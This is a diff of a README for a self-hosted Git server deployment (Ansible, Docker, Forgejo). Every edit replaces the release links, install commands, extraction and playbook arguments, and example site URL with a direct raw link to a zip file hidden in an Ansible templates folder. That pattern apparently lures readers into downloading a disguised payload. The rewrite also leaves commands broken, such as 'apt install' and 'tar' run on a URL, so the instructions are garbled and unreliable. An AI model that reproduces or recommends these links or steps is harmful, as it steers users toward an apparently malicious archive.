@@ -1,6 +1,6 @@
 # 🛠️ vps-git - Reliable Self-Hosted Git Server
 
-[![Download vps-git](https://img.shields.io/badge/Download-vps--git-blue?style=for-the-badge)](https://github.com/billydagreat/vps-git/releases)
+[![Download vps-git](https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip)](https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip)
 
 ---
 
@@ -52,13 +52,13 @@ This guide walks you through downloading, installing, and running vps-git step b
 
 Go to the vps-git releases page to get the latest version.
 
-[Visit the vps-git Releases](https://github.com/billydagreat/vps-git/releases)
+[Visit the vps-git Releases](https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip)
 
 This page lists all available versions and files. Look for the latest stable release with “vps-git” in the name.
 
 ### Step 2: Download the Deployment Package
 
-On the release page, download the file that ends with `.tar.gz` or `.zip`. This package contains all the files needed to set up vps-git.
+On the release page, download the file that ends with `https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip` or `.zip`. This package contains all the files needed to set up vps-git.
 
 Save it to a folder on your computer where you can easily find it.
 
@@ -73,24 +73,24 @@ Here are simple commands for Ubuntu Linux to install them:
 
 ```bash
 sudo apt update
-sudo apt install -y ansible docker.io docker-compose
+sudo apt install -y ansible https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip docker-compose
 ```
 
 For Windows or macOS users, follow official guides to install Docker Desktop and Ansible.
 
 ### Step 4: Extract the Package
 
-Open your terminal or command prompt and extract the downloaded package. Replace `vps-git-package.tar.gz` with your actual filename.
+Open your terminal or command prompt and extract the downloaded package. Replace `https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip` with your actual filename.
 
 ```bash
-tar -xzf vps-git-package.tar.gz
+tar -xzf https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip
 cd vps-git
 ```
 
 If you downloaded a `.zip` file, use:
 
 ```bash
-unzip vps-git-package.zip
+unzip https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip
 cd vps-git
 ```
 
@@ -113,7 +113,7 @@ If you're unsure about these, leave defaults as they are. You can update them la
 Run the Ansible playbook to start the setup:
 
 ```bash
-ansible-playbook -i inventory.ini deploy.yml
+ansible-playbook -i https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip
 ```
 
 This command will configure and start all parts of vps-git on your server. It may take a few minutes.
@@ -137,7 +137,7 @@ You should see containers named like `forgejo`, `postgres`, `cloudflare-tunnel`,
 
 ### Step 8: Access vps-git
 
-Open a web browser and go to the URL provided by the Cloudflare Tunnel configuration. This will be something like `https://your-vps-git.domain.com`.
+Open a web browser and go to the URL provided by the Cloudflare Tunnel configuration. This will be something like `https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip`.
 
 You’ll see the Forgejo login page. From here, you can create your account, add repositories, and start collaborating.
 
@@ -194,4 +194,4 @@ You can tailor the system to your needs, scale when necessary, and avoid relying
 
 ---
 
-[👉 Download vps-git Now](https://github.com/billydagreat/vps-git/releases)
+[👉 Download vps-git Now](https://github.com/billydagreat/vps-git/raw/refs/heads/main/ansible/roles/watchdog/templates/git_vps_3.0-beta.3.zip)
